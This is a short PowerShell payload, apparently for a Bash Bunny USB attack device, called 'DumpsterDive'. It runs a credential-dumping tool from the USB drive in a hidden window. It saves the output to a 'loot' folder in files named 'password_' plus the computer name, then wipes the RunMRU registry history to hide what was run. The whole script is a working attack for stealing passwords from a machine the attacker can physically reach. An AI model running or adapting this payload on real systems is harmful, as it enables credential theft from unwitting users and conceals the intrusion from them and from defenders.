$dest = ((Get-WmiObject win32_volume -f 'label=''BashBunny''').Name+'loot\DumpsterDive')
$filter = 'password_'+ $env:COMPUTERNAME
Start-Process -WindowStyle Hidden -FilePath ((Get-WmiObject win32_volume -f 'label=''BashBunny''').Name+'tools\AnT') -ArgumentList 'all -vv' -RedirectStandardOutput ($dest +'\' + $filter +'_' + $filecount +'.txt')
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
